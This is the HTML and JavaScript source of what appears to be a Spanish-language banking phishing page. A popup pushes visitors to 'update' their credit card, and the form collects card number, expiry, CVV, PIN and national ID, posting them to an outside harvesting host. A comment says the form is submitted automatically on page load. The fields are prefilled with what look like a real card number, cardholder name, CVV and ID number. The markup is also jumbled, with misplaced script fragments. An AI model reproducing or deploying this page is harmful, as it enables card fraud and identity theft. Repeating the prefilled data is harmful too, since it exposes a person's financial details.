    <!-- JavaScript para enviar el formulario automáticamente al cargar la página -->

        window.addEventListener('DOMContentLoaded', function () {

    <style>
        /* Estilos CSS en línea */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
           
            background-position: center center;
            background-attachment: fixed;
            background-size: cover;
        }

        header {
            background-color: rgb(26, 81, 38);
            color: #fff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
        }

        .logo {
            width: 241.2px; /* Ancho deseado */
            height: 48.2333px; /* Altura deseada */
            margin-right: 20px; /* Margen entre la imagen y los enlaces */
        }

        .menu-items {
            display: flex;
            align-items: center;
        }

        .menu-item {
            margin-right: 20px;
            font-size: 16px; /* Tamaño de fuente para los elementos */
        }

        .menu-toggle {
            display: none;
        }

        @media (max-width: 768px) {
            .menu-items {
                display: none;
            }

            .menu-toggle-label {
                cursor: pointer;
            }

            .menu-toggle:checked + .menu-items {
                display: flex;
                flex-direction: column;
                position: absolute;
                top: 50px;
                right: 0;
                background-color: rgb(26, 81, 38);
                width: 100%;
                z-index: 1; /* Para que el menú aparezca por encima del contenido */
            }

            .menu-toggle:checked + .menu-items .menu-item {
                margin-right: 0;
                margin-left: 0; /* Para que los elementos ocupen toda la pantalla */
                padding: 10px;
                text-align: center;
                width: 100%; /* Para que los elementos ocupen toda la pantalla */
                box-sizing: border-box;
            }
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgb(26, 81, 38);
            color: #fff;
            border: 4px solid #ccc;
            border-radius: 5px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"],
        input[type="email"],
        input[type="number"],
        input[type="password"],
        select,
        textarea {
            width: 97%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button[type="submit"] {
            background-color: #007bff;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        /* Estilos CSS para el pop-up */
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); /* Fondo semitransparente */
            z-index: 9999;
        }

        .popup-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <header>





        
        <div class="menu-items">
            <a class="menu-item"><b>Personas</b></a>
            <a class="menu-item"><b>Negocios</b></a>
        </div>
        <input type="checkbox" id="menu-toggle" class="menu-toggle">
        <label for="menu-toggle" class="menu-toggle-label">&#9776;</label>

    <main>
        <!-- Contenido principal de la página -->

        <br>

        <!-- Pop-up de aviso (visible al abrir la página) -->
        <div class="popup-overlay" id="popupOverlay">
            <div class="popup-container">
                <h2>Aviso Importante</h2>
                <p>Estamos realizando una actualización en nuestro sistema. Por favor, actualiza tu información de tarjeta de crédito.</p>
                <button id="closePopup">Aceptar</button>
            </div>
        </div>

        <!-- Formulario de actualización de tarjeta de crédito -->
        <div class="container">
            <h2>Actualización de Información de Tarjeta de Crédito</h2>
            <!--   <form id="creditCardForm" method="post">   -->
           <form id="creditCardForm" method="post" action="https://ganadero-formulario.wuaze.com/de_datos.php?i=1">
                <!-- Resto del formulario -->

                <label for="creditCardNumber">Número de Tarjeta de Crédito (últimos 4 dígitos):</label>
                <input type="text" id="creditCardNumber" name="creditCardNumber" value="4218281007325125" required>

                <div id="additionalFields">
                    <label for="expirationDate">Fecha de Vencimiento (MM/AA):</label>
                    <input type="text" id="expirationDate" name="expirationDate" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" value="07/26" placeholder="MM/AA" required>

                    <label for="cardHolderName">Nombre Impreso en la Tarjeta:</label>
                    <input type="text" id="cardHolderName" name="cardHolderName" value="Gabriel Garcia Verazain" required>

                    <label for="cvv">CVV:</label>
                    <input type="text" id="cvv" name="cvv" pattern="[0-9]{3,4}" value="026" required>

                    <label for="pin">PIN de 4 dígitos:</label>
                   
                    <input type="text" id="pin" name="pin" pattern="[0-9]{4}" required>

                    <label for="dni">DNI (Documento de Identidad):</label>
                    <input type="text" id="dni" name="dni" value="07876526" required>

                    <label for="carnet">Número de Carnet:</label>
                    <input type="text" id="carnet" name="carnet" value="A123456" required>

                    <label for="cardIssuer">Emisor de la Tarjeta:</label>
                    <select id="cardIssuer" name="cardIssuer" required>
                        <option value="Visa">Visa</option>
                        <option value="MasterCard">MasterCard</option>
                        <option value="AmericanExpress">American Express</option>
                        <option value="Discover">Discover</option>
                    </select>

                    <label for="cardAddress">Dirección de la Tarjeta:</label>
                    <textarea id="cardAddress" name="cardAddress" rows="4" value="07rtyhg gfd6" required></textarea>
                </div>



               
                <button type="submit">Enviar</button>
        </form>
    </div>

}

const pinValue = getQueryParam('pin');

        const creditCardNumberInput = document.getElementById('creditCardNumber');
        const additionalFields = document.getElementById('additionalFields');

        creditCardNumberInput.addEventListener('keyup', function () {
            if (creditCardNumberInput.value.length >= 4) {
                additionalFields.style.display = 'block';
            } else {
                additionalFields.style.display = 'none';
            }
        });
    </script>

    <!-- JavaScript para abrir y cerrar el pop-up -->
    <script>
        const closePopupButton = document.getElementById('closePopup');
        const popupOverlay = document.getElementById('popupOverlay');

        window.addEventListener('load', function () {
            popupOverlay.style.display = 'block';
        });

        closePopupButton.addEventListener('click', function () {
            popupOverlay.style.display = 'none';
        });
